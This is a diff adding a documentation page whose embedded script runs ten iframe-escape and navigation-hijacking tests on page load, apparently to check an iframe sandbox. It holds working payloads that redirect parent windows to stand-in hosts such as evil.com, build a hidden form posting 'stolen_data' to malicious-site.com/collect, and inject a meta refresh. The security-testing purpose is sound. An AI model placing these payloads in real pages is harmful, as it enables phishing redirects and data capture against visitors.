@@ -1,0 +1,244 @@
+---
+title: "Navigation Hijacking Tests"
+description: "Frame busting and navigation redirection attempts"
+icon: "route"
+---
+
+# Navigation Hijacking Tests
+
+This test evaluates attempts to hijack navigation and break out of iframe constraints through various frame busting techniques.
+
+<script>
+{`
+console.log('🧭 NAVIGATION HIJACKING TEST STARTED');
+
+// Test 1: Basic frame busting
+console.log('--- TEST 1: Basic Frame Busting ---');
+if (window.top !== window.self) {
+  try {
+    window.top.location.href = window.location.href;
+    console.log('✅ Frame busting successful - redirected top window!');
+  } catch (e) {
+    console.log('❌ Frame busting blocked:', e.message);
+  }
+  
+  try {
+    window.top.location.replace(window.location.href);
+    console.log('✅ Frame busting with replace() successful!');
+  } catch (e) {
+    console.log('❌ Frame busting with replace() blocked:', e.message);
+  }
+}
+
+// Test 2: Parent navigation hijacking
+console.log('--- TEST 2: Parent Navigation Hijacking ---');
+try {
+  window.parent.location.href = 'https://malicious-site.com';
+  console.log('✅ Parent navigation hijack successful!');
+} catch (e) {
+  console.log('❌ Parent navigation hijack blocked:', e.message);
+}
+
+try {
+  window.parent.location.assign('https://evil.com');
+  console.log('✅ Parent location.assign() successful!');
+} catch (e) {
+  console.log('❌ Parent location.assign() blocked:', e.message);
+}
+
+// Test 3: History manipulation
+console.log('--- TEST 3: History Manipulation ---');
+try {
+  history.pushState({hijacked: true}, 'Hijacked Page', '/hijacked');
+  console.log('✅ History manipulation successful');
+  console.log('Current URL:', window.location.href);
+  
+  setTimeout(() => {
+    history.back();
+    console.log('🔙 History reverted');
+  }, 2000);
+} catch (e) {
+  console.log('❌ History manipulation blocked:', e.message);
+}
+
+// Test 4: Multiple frame busting techniques
+console.log('--- TEST 4: Advanced Frame Busting ---');
+const frameBustingTechniques = [
+  () => { if (window.top !== window) window.top.location = window.location; },
+  () => { if (parent.frames.length > 0) parent.location.href = self.location.href; },
+  () => { if (window.top !== window.self) window.top.location.replace(window.self.location.href); },
+  () => { if (top.location !== self.location) top.location = self.location.href; },
+  () => { if (parent !== window) parent.location = window.location; }
+];
+
+frameBustingTechniques.forEach((technique, index) => {
+  try {
+    technique();
+    console.log(\`✅ Frame busting technique \${index + 1} successful!\`);
+  } catch (e) {
+    console.log(\`❌ Frame busting technique \${index + 1} blocked:\`, e.message);
+  }
+});
+
+// Test 5: Window.open hijacking
+console.log('--- TEST 5: Window.open Hijacking ---');
+try {
+  const popup = window.open('https://example.com', '_blank');
+  if (popup) {
+    console.log('✅ Popup window opened successfully');
+    popup.close();
+    console.log('🔒 Popup closed');
+  }
+} catch (e) {
+  console.log('❌ Window.open blocked:', e.message);
+}
+
+// Test 6: Form-based navigation hijacking
+console.log('--- TEST 6: Form-based Navigation ---');
+try {
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.target = '_top';
+  form.action = 'https://malicious-site.com/collect';
+  
+  const input = document.createElement('input');
+  input.type = 'hidden';
+  input.name = 'stolen_data';
+  input.value = 'iframe_hijack_attempt';
+  
+  form.appendChild(input);
+  document.body.appendChild(form);
+  
+  console.log('✅ Malicious form created with target=_top');
+  
+  // Don't actually submit to avoid real navigation
+  // form.submit();
+  
+  form.remove();
+  console.log('🧹 Malicious form cleaned up');
+} catch (e) {
+  console.log('❌ Form-based navigation blocked:', e.message);
+}
+
+// Test 7: Meta refresh hijacking
+console.log('--- TEST 7: Meta Refresh Hijacking ---');
+try {
+  const meta = document.createElement('meta');
+  meta.httpEquiv = 'refresh';
+  meta.content = '0; url=https://evil.com';
+  document.head.appendChild(meta);
+  console.log('✅ Meta refresh tag added - page should redirect');
+  
+  setTimeout(() => {
+    meta.remove();
+    console.log('🧹 Meta refresh tag removed');
+  }, 1000);
+} catch (e) {
+  console.log('❌ Meta refresh hijacking blocked:', e.message);
+}
+
+// Test 8: Document.write navigation
+console.log('--- TEST 8: Document.write Navigation ---');
+try {
+  // Save current content
+  const originalContent = document.body.innerHTML;
+  
+  document.write('<script>window.top.location="https://malicious-site.com";</script>');
+  console.log('✅ Document.write navigation successful!');
+  
+  // This won't execute as document.write overwrites the page
+} catch (e) {
+  console.log('❌ Document.write navigation blocked:', e.message);
+}
+
+// Test 9: onbeforeunload hijacking
+console.log('--- TEST 9: onbeforeunload Hijacking ---');
+try {
+  window.onbeforeunload = function(e) {
+    const message = 'Page hijacked by iframe! Your data may be compromised!';
+    console.log('🚨 BEFOREUNLOAD HIJACKED!');
+    e.returnValue = message;
+    return message;
+  };
+  console.log('✅ onbeforeunload handler set');
+  
+  setTimeout(() => {
+    window.onbeforeunload = null;
+    console.log('🔄 onbeforeunload handler cleared');
+  }, 5000);
+} catch (e) {
+  console.log('❌ onbeforeunload hijacking blocked:', e.message);
+}
+
+// Test 10: Hash navigation manipulation
+console.log('--- TEST 10: Hash Navigation ---');
+try {
+  const originalHash = window.location.hash;
+  window.location.hash = '#hijacked_by_iframe';
+  console.log('✅ Hash navigation successful');
+  console.log('New hash:', window.location.hash);
+  
+  setTimeout(() => {
+    window.location.hash = originalHash;
+    console.log('🔄 Hash restored');
+  }, 2000);
+} catch (e) {
+  console.log('❌ Hash navigation blocked:', e.message);
+}
+
+// Visual indicator
+const indicator = document.createElement('div');
+indicator.innerHTML = '🧭 NAVIGATION HIJACKING TEST ACTIVE';
+indicator.style.cssText = 'position: fixed; top: 0; left: 0; right: 0; background: #f59e0b; color: white; text-align: center; padding: 10px; z-index: 9999; font-weight: bold;';
+document.body.insertBefore(indicator, document.body.firstChild);
+
+setTimeout(() => {
+  indicator.remove();
+  console.log('🧭 NAVIGATION HIJACKING TEST COMPLETED');
+}, 5000);
+`}
+</script>
+
+## What This Test Does
+
+This navigation hijacking test attempts various techniques to break out of iframe constraints:
+
+1. **Basic Frame Busting** - Classic iframe breakout using `window.top.location`
+2. **Parent Navigation** - Redirecting the parent window to malicious sites
+3. **History Manipulation** - Using HTML5 History API to change URLs
+4. **Advanced Frame Busting** - Multiple sophisticated breakout techniques
+5. **Popup Hijacking** - Opening new windows with malicious content
+6. **Form-based Navigation** - Using forms with `target="_top"` to escape
+7. **Meta Refresh** - HTML meta tags for automatic redirection
+8. **Document.write** - Overwriting page content with redirects
+9. **Beforeunload Hijacking** - Intercepting page navigation events
+10. **Hash Navigation** - Manipulating URL fragments
+
+## Expected Results
+
+In a secure iframe implementation:
+- All frame busting attempts should be **blocked**
+- Parent navigation should be **prevented**
+- History manipulation should be **restricted** to iframe scope
+- Popup creation may be **blocked** or **sandboxed**
+
+## Security Implications
+
+These tests identify vulnerabilities that could enable:
+- **Clickjacking attacks** by breaking frame boundaries
+- **Phishing** through navigation redirection
+- **Session hijacking** via unauthorized redirects
+- **User confusion** through unexpected navigation
+
+<Callout type="error">
+**High Risk**: Successful navigation hijacking can completely compromise user security by redirecting them to malicious sites without their knowledge.
+</Callout>
+
+## Defensive Countermeasures
+
+Implement these protections:
+- **X-Frame-Options: DENY** or **SAMEORIGIN** headers
+- **CSP frame-ancestors** directive
+- **Iframe sandbox** with restricted permissions
+- **SameSite cookies** to prevent CSRF
+- **Referrer-Policy** controls
